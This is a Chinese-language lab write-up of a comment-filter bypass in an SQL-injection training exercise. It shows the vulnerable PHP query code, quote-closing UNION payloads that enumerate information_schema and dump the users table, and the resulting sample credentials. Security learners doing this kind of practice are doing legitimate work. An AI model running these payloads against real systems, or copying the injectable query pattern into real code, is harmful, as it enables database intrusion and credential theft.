如果遇到真实情况，这种报错改如何回想到源代码？

值得我思考。

```
注入1'
得到
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

我没猜出来源代码，不知道如何闭合



注入1' #

得到
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 
 
 看了报错，还是没明白，源代码是啥样，
 直接看文件里的源码


```

源代码

```
//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
.
.
.

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";


preg_replace($pattern,$replacement,$subject)在subject里匹配$pattern,替换为$replacement

这里，注释符号都被过滤了，就自动变成"",
所以?id=1' order by 3--+ ///   ?id=1' order by 3# 失效了
limit 0,1还存在
```



下面考虑对'1' 处理

```
?id=1' union select 1,2,'3 
这里出现两个回显，为2,3
所以我们知道数据库有三列，回显为2,3位置。
下面可以开始用union注入
```



```
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) ,'3

?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users') ,'3


?id=-1' union select 1,(select group_concat(concat_ws('-',username,password)) from security.users) ,'3

爆出
```



```
Your Login name:Dumb-Dumb,Angelina-I-kill-you,Dummy-p@ssword,secure-crappy,stupid-stupidity,superman-genious,batman-mob!le,admin-admin,admin1-admin1,admin2-admin2,admin3-admin3,dhakkan-dumbo,admin4-admin4
Your Password:3
```

结束

再次反思，遇到开头这种报错要联想起来源代码情况。
